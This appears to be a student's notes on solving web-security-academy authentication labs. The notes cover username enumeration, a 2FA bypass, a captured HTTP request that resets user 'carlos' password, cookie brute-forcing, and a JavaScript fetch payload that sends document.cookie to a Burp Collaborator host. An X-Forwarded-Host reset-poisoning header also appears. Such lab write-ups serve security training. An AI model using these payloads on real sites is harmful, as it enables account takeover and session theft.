# Authentication Vulnerabilities 

### Username enumeration via different responses

- Find valid username first

- Find valid password to valid username

- Bruteforce login using Burp or Script

### 2FA simple bypass

- When reach here https://0ac8003d04ed3772c09a2bea00f50071.web-security-academy.net/login2. just change URL to home page

### Password reset broken logic

POST /forgot-password?temp-forgot-password-token=o7PFBNNrTVxwkluRaPXuDzyhvEyjvc9g HTTP/1.1
Host: 0ac2008b042ee79cc1bb70b200870054.web-security-academy.net
Cookie: session=zNtvUch6LTfURMfAkcF6uVj7a5FLrF7v
Content-Length: 113
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ac2008b042ee79cc1bb70b200870054.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac2008b042ee79cc1bb70b200870054.web-security-academy.net/forgot-password?temp-forgot-password-token=o7PFBNNrTVxwkluRaPXuDzyhvEyjvc9g
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

temp-forgot-password-token=o7PFBNNrTVxwkluRaPXuDzyhvEyjvc9g&username=carlos&new-password-1=asd&new-password-2=asd

### Username enumeration via subtly different responses

- Similar to previous lab

- Valid username error message: "Invalid username or password"

- Invalid username error message: "Invalid username or password."

### Username enumeration via response timing

- Similar to previous lab

- Valid usernames have longer response times

- Spam filter bypass via `X-Forwarded-For`

### Brute-forcing a stay-logged-in cookie

- Base64 Decode Cookie

- Obtain username:hash

- Crack hash on crackstation to verify password and find out the type of hash that it is 

- Bruteforce cookie using Burp or Script

### Offline password cracking

```
fetch('https://h6o6bamm5o7blieiewq2uyzvfmlc91.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: document.cookie});
```

- After XSS payload injected, system will auto trigger it

- If system does not auto trigger the exploit, then use iframe or redirect to deliver payload

### Password reset poisoning via middleware

`X-Forwarded-Host: 95cng7cq7a796w2ot8ixgiaxyo4es3.burpcollaborator.net`

- URL to which password reset link is generated upon can be dependent on `X-Forwarded-Host` header

### 2FA broken logic

- Bruteforce cookie using Burp or Script

